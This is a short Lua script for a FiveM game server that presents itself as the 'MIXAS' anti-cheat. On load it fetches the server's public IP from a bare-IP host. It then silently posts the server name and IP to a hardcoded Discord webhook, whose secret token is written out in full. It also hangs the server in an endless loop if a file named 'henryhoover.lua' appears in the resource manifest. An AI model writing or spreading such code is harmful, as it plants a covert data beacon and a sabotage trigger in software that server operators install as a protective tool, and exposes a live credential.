SetConvarServerInfo("🛡️MIXAS", "AC")
PerformHttpRequest("http://94.143.231.57/myip.php", function(err, text, headers)
    startlog(text)
end, 'GET', "")
function startlog(ip)
    local serverName = GetConvar("sv_hostname","Unknown.")
    local connect = {
        {
            author = {
                icon_url = "https://cdn.discordapp.com/attachments/641717879858921503/767445777303470130/shield.png",
            },
            ["color"] = "824359",
            ["title"] = "Started",
            ["description"] = "AntiCheat started. --> \n ServerName : "..serverName.."\n Ip Adresi : "..ip,
            ["footer"] = {
            ["text"] = "MXS".." • "..os.date("%x %X %p"),
            },
        }
    }
    PerformHttpRequest("https://discord.com/api/webhooks/1002628511242129458/tFNUU_1Pk7oZQKzE7aF28WY0Ydyzr76SDX26cA_kEfpWJzkkP54ioJ4yG096tQszAgNa", function(err, text, headers) end, 'POST', json.encode({username = "MIXAS AC", embeds = connect}), { ['Content-Type'] = 'application/json' })
end
local code = LoadResourceFile(GetCurrentResourceName(),'fxmanifest.lua')
if string.find(code,'henryhoover.lua') then
    while true do
    end
end
